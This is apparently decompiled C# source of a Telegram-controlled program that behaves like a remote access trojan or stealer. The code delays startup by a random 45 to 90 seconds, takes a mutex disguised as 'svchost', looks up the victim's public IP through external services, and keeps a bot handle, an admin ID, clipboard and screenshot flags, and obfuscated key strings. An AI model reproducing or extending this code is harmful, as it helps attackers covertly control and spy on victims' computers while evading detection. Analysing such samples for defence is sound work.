using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;

namespace TelegramBot
{
	// Token: 0x020000EB RID: 235
	internal class Program
	{
		// Token: 0x0600031D RID: 797 RVA: 0x000031D9 File Offset: 0x000013D9
		[STAThread]
		private static void Main(string[] args)
		{
			Thread.Sleep(new Random().Next(45000, 90000));
			Start.GFHGFH();
		}

		// Token: 0x0600031E RID: 798 RVA: 0x00021FB4 File Offset: 0x000201B4
		public static bool Cheching()
		{
			bool result;
			Program.CheckMutex = new Mutex(true, "svchost", ref result);
			return result;
		}

		// Token: 0x0600031F RID: 799 RVA: 0x00021FD4 File Offset: 0x000201D4
		public static Task Run()
		{
			Program.<Run>d__22 <Run>d__;
			<Run>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<Run>d__.<>1__state = -1;
			AsyncTaskMethodBuilder <>t__builder = <Run>d__.<>t__builder;
			<>t__builder.Start<Program.<Run>d__22>(ref <Run>d__);
			return <Run>d__.<>t__builder.Task;
		}

		// Token: 0x06000320 RID: 800 RVA: 0x00022014 File Offset: 0x00020214
		public static string GetIP()
		{
			string result = "0.0.0.0";
			string[] array = new string[]
			{
				"http://ipinfo.io/ip",
				"http://ifconfig.me/ip",
				"https://api.ipify.org"
			};
			for (int i = 0; i < array.Length; i++)
			{
				try
				{
					result = new WebClient().DownloadString(array[i]);
					break;
				}
				catch
				{
				}
			}
			return result;
		}

		// Token: 0x04000525 RID: 1317
		public static Api Bot;

		// Token: 0x04000526 RID: 1318
		public static int AdminId;

		// Token: 0x04000527 RID: 1319
		public static string cdpath;

		// Token: 0x04000528 RID: 1320
		public static int perm = 1;

		// Token: 0x04000529 RID: 1321
		public static int permstate = 1;

		// Token: 0x0400052A RID: 1322
		public static bool wall = false;

		// Token: 0x0400052B RID: 1323
		public static bool fortune = false;

		// Token: 0x0400052C RID: 1324
		public static bool Clp = false;

		// Token: 0x0400052D RID: 1325
		public static bool Cbl = false;

		// Token: 0x0400052E RID: 1326
		public static bool Scr = false;

		// Token: 0x0400052F RID: 1327
		public static string here = "pzVpRVwnjbz1HNlS7CG8Hudr";

		// Token: 0x04000530 RID: 1328
		private static string code;

		// Token: 0x04000531 RID: 1329
		private static string functname;

		// Token: 0x04000532 RID: 1330
		public static bool mode = true;

		// Token: 0x04000533 RID: 1331
		public static string expansion;

		// Token: 0x04000534 RID: 1332
		public static string pubIp = Program.GetIP();

		// Token: 0x04000535 RID: 1333
		public static string fghdf = "qTVoRV8nirz8HNFS7CGzHuRrJpdXBGMbipEyUg9k7n3ByU2qoTCBzzoRuoFOQWVuD4GwK0TScU9CYgl7xu8AistaKMBpEtQmvFNbrUqnPgVzwMhSfRmZtHtO";

		// Token: 0x04000536 RID: 1334
		public static string N = "565243".ToString();

		// Token: 0x04000537 RID: 1335
		public static int stage = 0;

		// Token: 0x04000538 RID: 1336
		private static Mutex CheckMutex;
	}
}
